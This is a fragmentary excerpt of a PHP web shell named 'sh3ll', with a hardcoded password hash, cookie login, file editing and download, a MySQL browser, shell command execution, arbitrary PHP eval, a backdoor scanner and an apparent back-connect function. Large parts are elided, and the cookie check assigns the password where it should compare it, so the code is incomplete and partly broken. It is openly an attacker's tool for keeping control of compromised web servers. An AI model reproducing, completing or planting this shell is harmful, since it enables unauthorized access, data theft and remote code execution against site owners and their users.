...
class sh3ll {
    private $con;
    private $name = "Web Shell";
    private $version = "0.0";
    private $author = "Orhun İpek";
    ...
    private $pdo;
    private $user;
    private $password ="08a207fc9a8c2494286753f0674660af";
    private $favicon = "";
    ...
    {
        $r='';
		$menu = array("[Files]"=>"?act=file&dir=".$this->dir()."", "[MYSQL]"=>"?act=mysql");
        $r.="<div id='menu'>";
        foreach($menu as $key => $value){
        $r.="<a href='?{$value}'>".$key."</a>";
        }
        $r.="</div>";
        return $r;
    }
  ...
  ####   ###  ##  ##   ##  ### ##   ### ###   ## ##    ## ##   ##  ###  
    ...
    {
        $r='';
        $r.="<div id='footer'>{$this->name} {$this->version} - {$this->author}</div>";
        return $r;
    }
    function xpl() {
		$r='';
	...
	function up($d) {
		...
		array_pop($d);
		array_pop($d);
		$r=implode($s, $d).DIRECTORY_SEPARATOR;
		return $r;
	}
	function current($f) {
	...
	function phpeval() {
		...
		if(isset($_POST['submit'])&&!empty($_POST['eval']))
		{
			...
			header("location:?act=file&dir=".$this->dir());
			die();
		}
		$r.='</div>';
		return $r;
	...
	function updaterow() {
		...
		$r.("location:?act=showcon&db=$db&table=$tbl");
		exit();
		exit();
	}
	function showcon() {
    ...
    function downdb()
	{
		...
		elseif(isset($_GET['db'])&&isset($_GET['table']))
		{
		 ...
		 else echo "yanlış sularda yüzüyorsun kardeşşşşş";
    ...
    function auth() {
		...
		<input value="root@iambl0ck:-$" disabled="disabled"><br>Password :
	...
	function cookies() {			
		...
		if($this->password=$pass) {
			setcookie('sh3ll',$pass,time()+3600*24);
			$url=$_SERVER['SCRIPT_NAME'];
			header('location:'.$url);
			die();
		}
		}
		if(empty($_COOKIE['sh3ll']) and $_COOKIE['sh3ll'] !=$this->password) {
			echo $this->auth();
			die();
		}
...
switch ($_GET['act']) {
	...
	break;
	case 'edit':
	$r.=$sh3ll->edit($_GET['file']);
	break;
	case 'ren':
	$r.=$sh3ll->ren($_GET['file']);
	break;
	case 'cmd':
	$r.=$sh3ll->command();
	$r.=$sh3ll->center();
	break;
	case 'downfile':
	$r.=$sh3ll->downloadfile($_GET['file']);
		break;
	case 'down':
	$r.=$sh3ll->get_selected($_GET['file']);
	break;
	case 'downfolder':
	$r.=$sh3ll->downloadfolder($_GET['file']);
	break;
	case 'mysql':
	$r.=$sh3ll->login();
	break;
	...
	$r.=$sh3ll->droprow();
	break;
	case 'insertrow':$r.=$sh3ll->insertrow();break;
	case 'encode':$r.=$sh3ll->converter();break;
	case 'ser':$r.=$sh3ll->infoser();break;
	case "eval":$r.=$sh3ll->phpeval();$r.=$sh3ll->center();break;
	case 'write':$r.=$sh3ll->writable();break;
	case 'bds':$r.=$sh3ll->doorscan();break;
	case 'bc':$r.=$sh3ll->door();break;
	case 'loc':$r.=$sh3ll->locate();break;
	case 'search':$r.=$sh3ll->search();break;
	case 'lihat':$r.=$sh3ll->lihat($_GET['file']);break;
	case 'out':setcookie('sh3ll','',time()-3600*24);header("location:".$_SERVER['SCRIPT_NAME']);break;
	default:
	$r.=$sh3ll->logo();
	break;
...
switch ($_POST['action']) {
	case 'editfile':
		if($sh3ll->editfile($_POST['file']))
		$r.=header("location:?act=edit&dir=".$sh3ll->dir()."&file=".$_GET['file']."");
		break;
	case 'renamed':
		if($sh3ll->rename($_POST['file']))
		$r.=header("location:?act=file&dir=".$sh3ll->dir()."");
	break;
	case "mkdir":
	$r.=$sh3ll->mkdir();
	$r.=header("location:?act=file&dir=".$sh3ll->dir()."");
